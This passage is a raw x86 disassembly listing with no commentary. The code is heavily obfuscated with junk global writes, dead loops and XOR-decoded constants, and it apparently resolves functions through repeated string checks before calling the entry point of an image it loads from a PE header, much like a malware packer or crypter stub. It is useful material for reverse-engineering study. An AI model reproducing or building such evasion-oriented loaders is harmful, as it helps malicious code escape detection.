  41c6ee:	mov    eax,DWORD PTR [esp+0x3c]
  41c6f2:	adc    DWORD PTR ds:0x426ec1,0x19c6
  41c6fc:	xor    eax,esi
  41c6fe:	sbb    DWORD PTR ds:0x426ec5,0x426ea9
  41c708:	lea    eax,[ebp+eax*1+0x327302]
  41c70f:	xor    DWORD PTR ds:0x426ec1,0x34b0
  41c719:	push   eax
  41c71a:	xor    eax,DWORD PTR ds:0x426e99
  41c720:	mov    eax,ds:0x4262c9
  41c725:	adc    DWORD PTR ds:0x426ea5,0x426f09
  41c72f:	push   DWORD PTR [eax+0x1bc]
  41c735:	adc    DWORD PTR ds:0x426f0d,0x426ea5
  41c73f:	call   0x41d27f
  41c744:	mov    eax,DWORD PTR [esp+0x1c]
  41c748:	mov    ecx,DWORD PTR [esp+0x28]
  41c74c:	xor    eax,esi
  41c74e:	and    DWORD PTR ds:0x426e85,0x0
  41c758:	mov    edx,DWORD PTR ds:0x426e85
  41c75e:	inc    edx
  41c75f:	mov    DWORD PTR ds:0x426e85,edx
  41c765:	cmp    DWORD PTR ds:0x426e85,0x22
  41c76c:	jl     0x41c79c
  41c772:	jmp    0x41c78f
  41c777:	push   0x426000
  41c77c:	push   0x29cf
  41c781:	push   0x6715
  41c786:	push   DWORD PTR [ebp-0x18]
  41c789:	call   DWORD PTR ds:0x42fa24
  41c78f:	cmp    DWORD PTR ds:0x426e85,0x1b
  41c796:	jb     0x41c758
  41c79c:	lea    eax,[ecx+eax*1+0x3272fa]
  41c7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41c7a7:	mov    edx,DWORD PTR [esp+0x1c]
  41c7ab:	xor    edx,esi
  41c7ad:	sbb    DWORD PTR ds:0x426f29,0x426e8d
  41c7b7:	xor    ecx,esi
  41c7b9:	add    ecx,edx
  41c7bb:	sbb    edx,DWORD PTR ds:0x426f1d
  41c7c1:	mov    edx,DWORD PTR [esp+0x1c]
  41c7c5:	adc    DWORD PTR ds:0x426ef9,0x135a
  41c7cf:	xor    edx,esi
  41c7d1:	mov    DWORD PTR ds:0x426ee5,0x2979
  41c7db:	lea    ecx,[ecx+edx*1+0x9758ee]
  41c7e2:	mov    DWORD PTR ds:0x426f2d,0x689
  41c7ec:	mov    DWORD PTR [esp+0x28],eax
  41c7f0:	cmp    eax,ecx
  41c7f2:	mov    DWORD PTR ds:0x426efd,0x13db
  41c7fc:	jbe    0x41c58a
  41c802:	mov    eax,DWORD PTR [ebp+0xc]
  41c805:	mov    ds:0x42614d,eax
  41c80a:	and    DWORD PTR ds:0x426eb1,0x0
  41c814:	jmp    0x41c824
  41c819:	mov    eax,ds:0x426eb1
  41c81e:	inc    eax
  41c81f:	mov    ds:0x426eb1,eax
  41c824:	cmp    DWORD PTR ds:0x426eb1,0x19
  41c82b:	jae    0x41c851
  41c831:	cmp    DWORD PTR ds:0x426eb1,0x20
  41c838:	jl     0x41c851
  41c83e:	jmp    0x41c84c
  41c843:	push   DWORD PTR [ebp-0xc]
  41c846:	call   DWORD PTR ds:0x42fa28
  41c84c:	jmp    0x41c819
  41c851:	mov    eax,DWORD PTR [ebp+0x10]
  41c854:	mov    ds:0x4263a9,eax
  41c859:	mov    ecx,DWORD PTR ds:0x42af11
  41c85f:	mov    eax,ds:0x42af1d
  41c864:	sub    eax,ecx
  41c866:	xor    ecx,DWORD PTR [ecx+eax*1]
  41c869:	mov    eax,ds:0x42614d
  41c86e:	inc    ecx
  41c86f:	mov    ecx,DWORD PTR [esp+0x44]
  41c873:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c87d:	sub    eax,ebx
  41c87f:	sub    DWORD PTR ds:0x426eed,0x426f05
  41c889:	xor    eax,esi
  41c88b:	mov    DWORD PTR [ecx],eax
  41c88d:	mov    DWORD PTR ds:0x426ea1,0x1d16
  41c897:	lea    eax,[esp+0x20]
  41c89b:	mov    DWORD PTR ds:0x426f1d,0x743e
  41c8a5:	mov    DWORD PTR [esp+0x4c],eax
  41c8a9:	mov    DWORD PTR ds:0x426eb5,0x1725
  41c8b3:	lea    eax,[ebp+0x4]
  41c8b6:	mov    DWORD PTR ds:0x426f0d,0x331f
  41c8c0:	mov    DWORD PTR [esp+0x20],eax
  41c8c4:	mov    DWORD PTR ds:0x426ea1,0x4fd1
  41c8ce:	mov    al,ds:0x426537
  41c8d3:	cmp    al,BYTE PTR ds:0x426542
  41c8d9:	jne    0x41c211
  41c8df:	mov    al,ds:0x426554
  41c8e4:	mov    DWORD PTR ds:0x426e99,0x22c3
  41c8ee:	cmp    al,BYTE PTR ds:0x426563
  41c8f4:	mov    DWORD PTR ds:0x426f21,0x5c30
  41c8fe:	jne    0x41c211
  41c904:	sub    DWORD PTR ds:0x426eb5,0x53da
  41c90e:	push   0x42656d
  41c913:	sbb    DWORD PTR ds:0x426f0d,0x426f15
  41c91d:	push   0x42657d
  41c922:	sbb    DWORD PTR ds:0x426e81,0x426e95
  41c92c:	call   edi
  41c92e:	test   eax,eax
  41c930:	mov    DWORD PTR ds:0x426f09,0x3f7d
  41c93a:	je     0x41c211
  41c940:	mov    al,ds:0x426593
  41c945:	mov    DWORD PTR ds:0x426f09,0x7a71
  41c94f:	cmp    al,BYTE PTR ds:0x42659e
  41c955:	mov    DWORD PTR ds:0x426f21,0x448e
  41c95f:	jne    0x41c211
  41c965:	mov    al,ds:0x4265b0
  41c96a:	cmp    al,BYTE PTR ds:0x4265bf
  41c970:	jne    0x41c211
  41c976:	push   0x4265c9
  41c97b:	add    DWORD PTR ds:0x426eb9,0x4508
  41c985:	push   0x4265d9
  41c98a:	call   edi
  41c98c:	test   eax,eax
  41c98e:	je     0x41c211
  41c994:	mov    DWORD PTR ds:0x426ed1,0x4635
  41c99e:	mov    al,ds:0x4265ef
  41c9a3:	mov    DWORD PTR ds:0x426f11,0x2d29
  41c9ad:	cmp    al,BYTE PTR ds:0x4265fa
  41c9b3:	mov    DWORD PTR ds:0x426f1d,0x5285
  41c9bd:	jne    0x41c211
  41c9c3:	mov    DWORD PTR ds:0x426ecd,0x17c5
  41c9cd:	mov    al,ds:0x42660c
  41c9d2:	mov    DWORD PTR ds:0x426ecd,0x1f4b
  41c9dc:	cmp    al,BYTE PTR ds:0x42661b
  41c9e2:	jne    0x41c211
  41c9e8:	push   0x426625
  41c9ed:	adc    DWORD PTR ds:0x426ef1,0x426ee5
  41c9f7:	push   0x426635
  41c9fc:	call   edi
  41c9fe:	adc    DWORD PTR ds:0x426edd,0x72d
  41ca08:	test   eax,eax
  41ca0a:	je     0x41c211
  41ca10:	mov    DWORD PTR ds:0x426ed9,0x3296
  41ca1a:	mov    al,ds:0x42664b
  41ca1f:	mov    DWORD PTR ds:0x426e91,0x9e5
  41ca29:	cmp    al,BYTE PTR ds:0x426656
  41ca2f:	mov    DWORD PTR ds:0x426ee1,0x4731
  41ca39:	jne    0x41c211
  41ca3f:	mov    al,ds:0x426668
  41ca44:	cmp    al,BYTE PTR ds:0x426677
  41ca4a:	jne    0x41c211
  41ca50:	xor    DWORD PTR ds:0x426e85,0x78df
  41ca5a:	push   0x426681
  41ca5f:	push   0x426691
  41ca64:	call   edi
  41ca66:	test   eax,eax
  41ca68:	je     0x41c211
  41ca6e:	mov    DWORD PTR ds:0x426efd,0x48d1
  41ca78:	mov    al,ds:0x4266a7
  41ca7d:	mov    DWORD PTR ds:0x426eb1,0x58ba
  41ca87:	cmp    al,BYTE PTR ds:0x4266b2
  41ca8d:	jne    0x41c211
  41ca93:	mov    al,ds:0x4266c4
  41ca98:	mov    DWORD PTR ds:0x426ea9,0x5172
  41caa2:	cmp    al,BYTE PTR ds:0x4266d3
  41caa8:	mov    DWORD PTR ds:0x426ecd,0x25dc
  41cab2:	jne    0x41c211
  41cab8:	add    DWORD PTR ds:0x426ef5,0x426ea9
  41cac2:	push   0x4266dd
  41cac7:	mov    DWORD PTR ds:0x426f1d,0x534b
  41cad1:	push   0x4266ed
  41cad6:	xor    DWORD PTR ds:0x426e8d,0x426e89
  41cae0:	call   edi
  41cae2:	test   eax,eax
  41cae4:	mov    DWORD PTR ds:0x426f09,0x17e9
  41caee:	je     0x41c211
  41caf4:	mov    DWORD PTR ds:0x426f15,0x546d
  41cafe:	mov    al,ds:0x426703
  41cb03:	mov    DWORD PTR ds:0x426ec9,0x6884
  41cb0d:	cmp    al,BYTE PTR ds:0x42670e
  41cb13:	mov    DWORD PTR ds:0x426e95,0x724e
  41cb1d:	jne    0x41c211
  41cb23:	mov    DWORD PTR ds:0x426eb1,0x7b3e
  41cb2d:	mov    al,ds:0x426720
  41cb32:	mov    DWORD PTR ds:0x426ea9,0xb8a
  41cb3c:	cmp    al,BYTE PTR ds:0x42672f
  41cb42:	mov    DWORD PTR ds:0x426ea5,0xfff
  41cb4c:	jne    0x41c211
  41cb52:	adc    DWORD PTR ds:0x426e81,0x426ed5
  41cb5c:	push   0x426739
  41cb61:	push   0x426749
  41cb66:	call   edi
  41cb68:	mov    DWORD PTR ds:0x426eb1,0x513e
  41cb72:	test   eax,eax
  41cb74:	je     0x41c211
  41cb7a:	mov    al,ds:0x42675f
  41cb7f:	mov    DWORD PTR ds:0x426e8d,0x24d0
  41cb89:	cmp    al,BYTE PTR ds:0x42676a
  41cb8f:	jne    0x41c211
  41cb95:	mov    DWORD PTR ds:0x426eb1,0x7a1a
  41cb9f:	mov    al,ds:0x42677c
  41cba4:	mov    DWORD PTR ds:0x426ef5,0x1244
  41cbae:	cmp    al,BYTE PTR ds:0x42678b
  41cbb4:	mov    DWORD PTR ds:0x426ed1,0x3050
  41cbbe:	jne    0x41c211
  41cbc4:	sub    DWORD PTR ds:0x426ee1,0x426f25
  41cbce:	push   0x426795
  41cbd3:	add    DWORD PTR ds:0x426f11,0x40a8
  41cbdd:	push   0x4267a5
  41cbe2:	sub    DWORD PTR ds:0x426ef9,0x426e9d
  41cbec:	call   edi
  41cbee:	adc    DWORD PTR ds:0x426e99,0x426f0d
  41cbf8:	test   eax,eax
  41cbfa:	je     0x41c211
  41cc00:	mov    al,ds:0x4267bb
  41cc05:	mov    DWORD PTR ds:0x426f05,0xc7b
  41cc0f:	cmp    al,BYTE PTR ds:0x4267c6
  41cc15:	mov    DWORD PTR ds:0x426eb9,0x70f1
  41cc1f:	jne    0x41c211
  41cc25:	mov    al,ds:0x4267d8
  41cc2a:	mov    DWORD PTR ds:0x426f09,0x320
  41cc34:	cmp    al,BYTE PTR ds:0x4267e7
  41cc3a:	mov    DWORD PTR ds:0x426ee1,0xc80
  41cc44:	jne    0x41c211
  41cc4a:	sbb    DWORD PTR ds:0x426e85,0x426ea9
  41cc54:	push   0x4267f1
  41cc59:	adc    DWORD PTR ds:0x426f21,0x426f09
  41cc63:	push   0x426801
  41cc68:	call   edi
  41cc6a:	test   eax,eax
  41cc6c:	mov    DWORD PTR ds:0x426e9d,0x1d82
  41cc76:	je     0x41c211
  41cc7c:	mov    DWORD PTR ds:0x426e8d,0x4c1f
  41cc86:	mov    al,ds:0x426817
  41cc8b:	mov    DWORD PTR ds:0x426ebd,0x2305
  41cc95:	cmp    al,BYTE PTR ds:0x426822
  41cc9b:	mov    DWORD PTR ds:0x426e85,0x52ee
  41cca5:	jne    0x41c211
  41ccab:	mov    DWORD PTR ds:0x426eed,0x1308
  41ccb5:	mov    al,ds:0x426834
  41ccba:	cmp    al,BYTE PTR ds:0x426843
  41ccc0:	mov    DWORD PTR ds:0x426ea9,0x1ac4
  41ccca:	jne    0x41c211
  41ccd0:	push   0x42684d
  41ccd5:	push   0x42685d
  41ccda:	call   edi
  41ccdc:	xor    DWORD PTR ds:0x426eb5,0x537b
  41cce6:	test   eax,eax
  41cce8:	mov    DWORD PTR ds:0x426f2d,0x4412
  41ccf2:	je     0x41c211
  41ccf8:	mov    al,ds:0x426873
  41ccfd:	mov    DWORD PTR ds:0x426eb1,0x52c5
  41cd07:	cmp    al,BYTE PTR ds:0x42687e
  41cd0d:	mov    DWORD PTR ds:0x426f01,0x16df
  41cd17:	jne    0x41c211
  41cd1d:	mov    DWORD PTR ds:0x426ee1,0xd56
  41cd27:	mov    al,ds:0x426890
  41cd2c:	mov    DWORD PTR ds:0x426ed1,0x624d
  41cd36:	cmp    al,BYTE PTR ds:0x42689f
  41cd3c:	mov    DWORD PTR ds:0x426e95,0x6fa7
  41cd46:	jne    0x41c211
  41cd4c:	push   0x4268a9
  41cd51:	push   0x4268b9
  41cd56:	call   edi
  41cd58:	test   eax,eax
  41cd5a:	je     0x41c211
  41cd60:	mov    al,ds:0x4268cf
  41cd65:	mov    DWORD PTR ds:0x426ea5,0x6b61
  41cd6f:	cmp    al,BYTE PTR ds:0x4268da
  41cd75:	mov    DWORD PTR ds:0x426ef1,0x607d
  41cd7f:	jne    0x41c211
  41cd85:	mov    al,ds:0x4268ec
  41cd8a:	mov    DWORD PTR ds:0x426f11,0x76ce
  41cd94:	cmp    al,BYTE PTR ds:0x4268fb
  41cd9a:	mov    DWORD PTR ds:0x426ea9,0x7be9
  41cda4:	jne    0x41c211
  41cdaa:	push   0x426905
  41cdaf:	xor    DWORD PTR ds:0x426e89,0x5d69
  41cdb9:	push   0x426915
  41cdbe:	call   edi
  41cdc0:	test   eax,eax
  41cdc2:	je     0x41c211
  41cdc8:	mov    al,ds:0x42692b
  41cdcd:	mov    DWORD PTR ds:0x426eed,0x2af5
  41cdd7:	cmp    al,BYTE PTR ds:0x426936
  41cddd:	mov    DWORD PTR ds:0x426ed9,0x56c9
  41cde7:	jne    0x41c211
  41cded:	mov    DWORD PTR ds:0x426f09,0x21f5
  41cdf7:	mov    al,ds:0x426948
  41cdfc:	cmp    al,BYTE PTR ds:0x426957
  41ce02:	jne    0x41c211
  41ce08:	push   0x426961
  41ce0d:	sub    DWORD PTR ds:0x426ef1,0x426f19
  41ce17:	push   0x426971
  41ce1c:	call   edi
  41ce1e:	or     DWORD PTR ds:0x426f11,0x426ea1
  41ce28:	test   eax,eax
  41ce2a:	je     0x41c211
  41ce30:	mov    DWORD PTR ds:0x426f1d,0x33c9
  41ce3a:	mov    al,ds:0x426987
  41ce3f:	cmp    al,BYTE PTR ds:0x426992
  41ce45:	jne    0x41c211
  41ce4b:	mov    al,ds:0x4269a4
  41ce50:	cmp    al,BYTE PTR ds:0x4269b3
  41ce56:	jne    0x41c211
  41ce5c:	push   0x4269bd
  41ce61:	push   0x4269cd
  41ce66:	call   edi
  41ce68:	test   eax,eax
  41ce6a:	je     0x41c211
  41ce70:	mov    al,ds:0x4269e3
  41ce75:	cmp    al,BYTE PTR ds:0x4269ee
  41ce7b:	jne    0x41c211
  41ce81:	mov    al,ds:0x426a00
  41ce86:	cmp    al,BYTE PTR ds:0x426a0f
  41ce8c:	jne    0x41c211
  41ce92:	push   0x426a19
  41ce97:	push   0x426a29
  41ce9c:	call   edi
  41ce9e:	test   eax,eax
  41cea0:	je     0x41c211
  41cea6:	mov    al,ds:0x426a3f
  41ceab:	cmp    al,BYTE PTR ds:0x426a4a
  41ceb1:	jne    0x41c211
  41ceb7:	mov    al,ds:0x426a5c
  41cebc:	cmp    al,BYTE PTR ds:0x426a6b
  41cec2:	jne    0x41c211
  41cec8:	push   0x426a75
  41cecd:	push   0x426a85
  41ced2:	call   edi
  41ced4:	test   eax,eax
  41ced6:	je     0x41c211
  41cedc:	mov    al,ds:0x426a9b
  41cee1:	cmp    al,BYTE PTR ds:0x426aa6
  41cee7:	jne    0x41c211
  41ceed:	mov    al,ds:0x426ab8
  41cef2:	cmp    al,BYTE PTR ds:0x426ac7
  41cef8:	jne    0x41c211
  41cefe:	push   0x426ad1
  41cf03:	push   0x426ae1
  41cf08:	call   edi
  41cf0a:	test   eax,eax
  41cf0c:	je     0x41c211
  41cf12:	mov    al,ds:0x426af7
  41cf17:	cmp    al,BYTE PTR ds:0x426b02
  41cf1d:	jne    0x41c211
  41cf23:	mov    al,ds:0x426b14
  41cf28:	cmp    al,BYTE PTR ds:0x426b23
  41cf2e:	jne    0x41c211
  41cf34:	push   0x426b2d
  41cf39:	push   0x426b3d
  41cf3e:	call   edi
  41cf40:	test   eax,eax
  41cf42:	je     0x41c211
  41cf48:	mov    al,ds:0x426b53
  41cf4d:	cmp    al,BYTE PTR ds:0x426b5e
  41cf53:	jne    0x41c211
  41cf59:	mov    al,ds:0x426b70
  41cf5e:	cmp    al,BYTE PTR ds:0x426b7f
  41cf64:	jne    0x41c211
  41cf6a:	push   0x426b89
  41cf6f:	push   0x426b99
  41cf74:	call   edi
  41cf76:	test   eax,eax
  41cf78:	je     0x41c211
  41cf7e:	mov    al,ds:0x426baf
  41cf83:	cmp    al,BYTE PTR ds:0x426bba
  41cf89:	jne    0x41c211
  41cf8f:	mov    al,ds:0x426bcc
  41cf94:	cmp    al,BYTE PTR ds:0x426bdb
  41cf9a:	jne    0x41c211
  41cfa0:	push   0x426be5
  41cfa5:	push   0x426bf5
  41cfaa:	call   edi
  41cfac:	test   eax,eax
  41cfae:	je     0x41c211
  41cfb4:	mov    al,ds:0x426c0b
  41cfb9:	cmp    al,BYTE PTR ds:0x426c16
  41cfbf:	jne    0x41c211
  41cfc5:	mov    al,ds:0x426c28
  41cfca:	cmp    al,BYTE PTR ds:0x426c37
  41cfd0:	jne    0x41c211
  41cfd6:	push   0x426c41
  41cfdb:	push   0x426c51
  41cfe0:	call   edi
  41cfe2:	test   eax,eax
  41cfe4:	je     0x41c211
  41cfea:	mov    al,ds:0x426c67
  41cfef:	cmp    al,BYTE PTR ds:0x426c72
  41cff5:	jne    0x41c211
  41cffb:	mov    al,ds:0x426c84
  41d000:	cmp    al,BYTE PTR ds:0x426c93
  41d006:	jne    0x41c211
  41d00c:	push   0x426c9d
  41d011:	push   0x426cad
  41d016:	call   edi
  41d018:	test   eax,eax
  41d01a:	je     0x41c211
  41d020:	mov    eax,DWORD PTR [esp+0x34]
  41d024:	cmp    eax,0xf89c85b4
  41d029:	je     0x41d088
  41d02f:	mov    eax,DWORD PTR [esp+0x10]
  41d033:	mov    ecx,DWORD PTR [esp+0x30]
  41d037:	xor    eax,esi
  41d039:	add    eax,ebx
  41d03b:	cmp    eax,ecx
  41d03d:	je     0x41d088
  41d043:	mov    eax,ds:0x4262c9
  41d048:	mov    eax,DWORD PTR [eax+0x194]
  41d04e:	mov    ecx,DWORD PTR [eax]
  41d050:	mov    eax,DWORD PTR [ecx+0x3c]
  41d053:	push   DWORD PTR ds:0x4263a9
  41d059:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41d05d:	push   DWORD PTR ds:0x42614d
  41d063:	add    eax,ecx
  41d065:	mov    ecx,DWORD PTR ds:0x4262c9
  41d06b:	mov    ecx,DWORD PTR [ecx+0x194]
  41d071:	push   DWORD PTR [ecx]
  41d073:	call   eax
  41d075:	mov    ecx,DWORD PTR ds:0x4262c9
  41d07b:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d081:	mov    DWORD PTR [ecx],eax
  41d083:	jmp    0x41d259
  41d088:	mov    eax,DWORD PTR [esp+0x10]
  41d08c:	mov    ecx,DWORD PTR [esp+0x48]
  41d090:	xor    eax,esi
  41d092:	add    eax,ebx
  41d094:	cmp    eax,ecx
  41d096:	jne    0x41d101
  41d09c:	mov    eax,DWORD PTR [esp+0x10]
  41d0a0:	mov    ecx,DWORD PTR ds:0x4262c9
  41d0a6:	mov    ecx,DWORD PTR [ecx+0x198]
  41d0ac:	xor    eax,esi
  41d0ae:	add    eax,ebx
  41d0b0:	cmp    eax,DWORD PTR [ecx]
  41d0b2:	jne    0x41d0da
  41d0b8:	mov    eax,DWORD PTR [esp+0x10]
  41d0bc:	push   0xffffffff
  41d0be:	push   0x70941f8a
  41d0c3:	xor    eax,esi
  41d0c5:	add    eax,ebx
  41d0c7:	push   eax
  41d0c8:	push   0xf89c85b9
  41d0cd:	push   DWORD PTR [esp+0x2c]
  41d0d1:	push   DWORD PTR [esp+0x24]
  41d0d5:	call   0x417355
  41d0da:	push   DWORD PTR [esp+0x1c]
  41d0de:	push   DWORD PTR [esp+0x14]
  41d0e2:	call   0x401000
  41d0e7:	mov    eax,DWORD PTR [esp+0x10]
  41d0eb:	xor    eax,esi
  41d0ed:	add    eax,ebx
  41d0ef:	mov    ds:0x426355,eax
  41d0f4:	mov    eax,DWORD PTR [esp+0x10]
  41d0f8:	xor    eax,esi
  41d0fa:	add    eax,ebx
  41d0fc:	mov    ds:0x42634d,eax
  41d101:	mov    eax,DWORD PTR [esp+0x20]
  41d105:	test   eax,eax
  41d107:	je     0x41d259
  41d10d:	mov    DWORD PTR [esp+0x50],0xf152c3c
  41d115:	mov    DWORD PTR [esp+0x54],0x712edcf
  41d11d:	mov    DWORD PTR [esp+0x58],0x373fc2d
  41d125:	mov    DWORD PTR [esp+0x5c],0x72670add
  41d12d:	call   0x416fa9
  41d132:	mov    eax,DWORD PTR [esp+0x24]
  41d136:	mov    eax,DWORD PTR [esp+0x1c]
  41d13a:	mov    DWORD PTR [esp+0x44],eax
  41d13e:	mov    eax,DWORD PTR [esp+0x10]
  41d142:	mov    DWORD PTR [esp+0x1c],eax
  41d146:	mov    eax,eax
  41d148:	mov    eax,ds:0x4262c9
  41d14d:	mov    ecx,DWORD PTR [eax+0x1c0]
  41d153:	mov    edx,DWORD PTR [ecx]
  41d155:	and    DWORD PTR [esp+0x3c],0x0
  41d15a:	mov    edi,0xfabdbecd
  41d15f:	add    edx,edi
  41d161:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d166:	mov    ecx,0x8a29a147
  41d16b:	xor    edx,ecx
  41d16d:	mov    DWORD PTR [esp+0x28],edx
  41d171:	mov    edx,DWORD PTR [esp+0x3c]
  41d175:	xor    edx,0x0
  41d178:	cmp    DWORD PTR [esp+0x28],0x70941f89
  41d180:	mov    DWORD PTR [esp+0x2c],edx
  41d184:	jne    0x41d193
  41d18a:	cmp    edx,0xffffffff
  41d18d:	je     0x41d1fc
  41d193:	mov    eax,DWORD PTR [eax+0x1c8]
  41d199:	mov    eax,DWORD PTR [eax]
  41d19b:	cdq    
  41d19c:	add    eax,edi
  41d19e:	adc    edx,0xffffffff
  41d1a1:	and    DWORD PTR [esp+0x3c],0x0
  41d1a6:	xor    edx,0x0
  41d1a9:	mov    DWORD PTR [esp+0x14],edx
  41d1ad:	mov    edx,DWORD PTR [esp+0x1c]
  41d1b1:	mov    DWORD PTR [esp+0x38],edx
  41d1b5:	xor    eax,ecx
  41d1b7:	add    DWORD PTR [esp+0x38],edi
  41d1bb:	mov    edx,DWORD PTR [esp+0x38]
  41d1bf:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d1c4:	xor    edx,ecx
  41d1c6:	mov    DWORD PTR [esp+0x28],edx
  41d1ca:	mov    edx,DWORD PTR [esp+0x3c]
  41d1ce:	xor    edx,0x0
  41d1d1:	mov    DWORD PTR [esp+0x2c],edx
  41d1d5:	cmp    DWORD PTR [esp+0x28],eax
  41d1d9:	jne    0x41d1eb
  41d1df:	mov    eax,DWORD PTR [esp+0x14]
  41d1e3:	cmp    edx,eax
  41d1e5:	je     0x41d1fc
  41d1eb:	mov    eax,DWORD PTR [esp+0x1c]
  41d1ef:	add    eax,DWORD PTR [esp+0x44]
  41d1f3:	mov    DWORD PTR [esp+0x1c],eax
  41d1f7:	jmp    0x41d259
  41d1fc:	mov    eax,ds:0x42634d
  41d201:	mov    edx,DWORD PTR ds:0x426355
  41d207:	xor    eax,edx
  41d209:	mov    ds:0x42634d,eax
  41d20e:	mov    edx,DWORD PTR ds:0x42634d
  41d214:	mov    eax,DWORD PTR [esp+0x20]
  41d218:	add    DWORD PTR [eax],edx
  41d21a:	mov    edx,DWORD PTR [esp+0x1c]
  41d21e:	mov    eax,ds:0x42634d
  41d223:	xor    edx,esi
  41d225:	add    edx,ebx
  41d227:	xor    ebx,ebx
  41d229:	add    edx,edi
  41d22b:	adc    ebx,0xffffffff
  41d22e:	xor    esi,esi
  41d230:	xor    edx,ecx
  41d232:	xor    ebx,0x0
  41d235:	add    eax,edi
  41d237:	adc    esi,0xffffffff
  41d23a:	xor    eax,ecx
  41d23c:	xor    esi,0x0
  41d23f:	cmp    eax,edx
  41d241:	jne    0x41d259
  41d247:	cmp    esi,ebx
  41d249:	jne    0x41d259
  41d24f:	mov    eax,ds:0x42634d
  41d254:	mov    ds:0x426355,eax
  41d259:	mov    eax,ds:0x4262c9
  41d25e:	push   0x4
  41d260:	add    eax,0x1cc
  41d265:	push   eax
  41d266:	lea    eax,[esp+0x2c]
  41d26a:	push   eax
  41d26b:	call   0x41d27f
  41d270:	mov    eax,DWORD PTR [esp+0x24]
  41d274:	mov    eax,DWORD PTR [eax]
  41d276:	pop    edi
  41d277:	pop    esi
  41d278:	pop    ebx
  41d279:	mov    esp,ebp
  41d27b:	pop    ebp
  41d27c:	ret    0xc
  41d27f:	push   ebp
  41d280:	mov    ebp,esp
  41d282:	sub    esp,0x10
  41d285:	mov    eax,ds:0x427de1
  41d28a:	mov    ecx,DWORD PTR ds:0x429ea5
  41d290:	sub    eax,ecx
  41d292:	add    eax,DWORD PTR [eax+ecx*1]
  41d295:	mov    eax,0xf89c85b5
  41d29a:	and    DWORD PTR ds:0x426eb9,ecx
  41d2a0:	mov    DWORD PTR [ebp-0x4],eax
  41d2a3:	and    DWORD PTR ds:0x426f29,0x0
  41d2ad:	mov    edx,DWORD PTR ds:0x426f29
  41d2b3:	inc    edx
  41d2b4:	mov    DWORD PTR ds:0x426f29,edx
  41d2ba:	cmp    DWORD PTR ds:0x426f29,0xc
  41d2c1:	jge    0x41d300
  41d2c7:	jmp    0x41d2d7
  41d2cc:	push   0x4f6e
  41d2d1:	call   DWORD PTR ds:0x42fa2c
  41d2d7:	cmp    DWORD PTR ds:0x426f29,0xb
  41d2de:	jne    0x41d2f3
  41d2e4:	xor    edx,edx
  41d2e6:	add    edx,DWORD PTR ds:0x426f29
  41d2ec:	inc    edx
  41d2ed:	mov    DWORD PTR ds:0x426f29,edx
  41d2f3:	cmp    DWORD PTR ds:0x426f29,0x14
  41d2fa:	jb     0x41d2ad
  41d300:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  41d307:	mov    edx,DWORD PTR ds:0x426ee9
  41d30d:	sbb    DWORD PTR ds:0x426f21,edx
  41d313:	mov    ecx,DWORD PTR [ebp-0x4]
  41d316:	mov    DWORD PTR ds:0x426ebd,0x1b
  41d320:	cmp    DWORD PTR ds:0x426ebd,0x0
  41d327:	je     0x41d371
  41d32d:	cmp    DWORD PTR ds:0x426ebd,0x2
  41d334:	jg     0x41d371
  41d33a:	jmp    0x41d345
  41d33f:	call   DWORD PTR ds:0x42fa38
  41d345:	cmp    DWORD PTR ds:0x426ebd,0x3
  41d34c:	jne    0x41d35f
  41d352:	mov    edx,DWORD PTR ds:0x426ebd
  41d358:	dec    edx
  41d359:	mov    DWORD PTR ds:0x426ebd,edx
  41d35f:	mov    edx,DWORD PTR ds:0x426ebd
  41d365:	dec    edx
  41d366:	mov    DWORD PTR ds:0x426ebd,edx
  41d36c:	jmp    0x41d320
  41d371:	push   esi
  41d372:	or     edx,0x1404
  41d378:	mov    edx,0x75108b3
  41d37d:	mov    esi,DWORD PTR ds:0x426eb5
  41d383:	and    DWORD PTR ds:0x426e95,esi
  41d389:	xor    ecx,edx
  41d38b:	xor    esi,DWORD PTR ds:0x426eb9
  41d391:	mov    esi,0x3272fa
  41d396:	push   edi
  41d397:	xor    DWORD PTR ds:0x426ec5,0xe12
  41d3a1:	mov    edi,DWORD PTR [ebp+0x10]
  41d3a4:	add    ecx,esi
  41d3a6:	mov    DWORD PTR ds:0x426f09,0x182c
  41d3b0:	cmp    ecx,edi
  41d3b2:	je     0x41d4a2
  41d3b8:	mov    ecx,DWORD PTR [ebp-0x4]
  41d3bb:	movzx  edi,WORD PTR ds:0x426f09
  41d3c2:	add    DWORD PTR ds:0x426ea5,edi
  41d3c8:	mov    edi,DWORD PTR [ebp+0x10]
  41d3cb:	xor    eax,eax
  41d3cd:	xor    ecx,edx
  41d3cf:	add    ecx,esi
  41d3d1:	add    DWORD PTR ds:0x426ed1,0x330a
  41d3db:	add    edi,0xfabdbecd
  41d3e1:	mov    DWORD PTR ds:0x426ee5,0x5f33
  41d3eb:	adc    eax,0xffffffff
  41d3ee:	and    DWORD PTR ds:0x426ecd,0x4eeb
  41d3f8:	xor    eax,0x0
  41d3fb:	mov    DWORD PTR [ebp-0xc],eax
  41d3fe:	push   ebx
  41d3ff:	xor    ebx,ebx
  41d401:	xor    edi,0x8a29a147
  41d407:	mov    eax,ecx
  41d409:	add    eax,0xfabdbecd
  41d40e:	adc    ebx,0xffffffff
  41d411:	xor    eax,0x8a29a147
  41d416:	xor    ebx,0x0
  41d419:	cmp    eax,edi
  41d41b:	jne    0x41d434
  41d421:	cmp    ebx,DWORD PTR [ebp-0xc]
  41d424:	je     0x41d49c
  41d42a:	jmp    0x41d434
  41d42f:	mov    esi,0x3272fa
  41d434:	mov    eax,DWORD PTR [ebp-0x4]
  41d437:	mov    edi,DWORD PTR [ebp-0x8]
  41d43a:	xor    edi,edx
  41d43c:	add    edi,esi
  41d43e:	mov    esi,DWORD PTR [ebp+0x8]
  41d441:	imul   edi,ecx
  41d444:	mov    ebx,DWORD PTR [ebp+0xc]
  41d447:	xor    eax,edx
  41d449:	add    eax,ecx
  41d44b:	mov    al,BYTE PTR [ebx+eax*1+0x3272fa]
  41d452:	mov    BYTE PTR [edi+esi*1],al
  41d455:	mov    eax,DWORD PTR [ebp-0x8]
  41d458:	mov    esi,DWORD PTR [ebp+0x10]
  41d45b:	xor    eax,edx
  41d45d:	xor    ebx,ebx
  41d45f:	add    esi,0xfabdbecd
  41d465:	adc    ebx,0xffffffff
  41d468:	lea    ecx,[ecx+eax*1+0x3272fa]
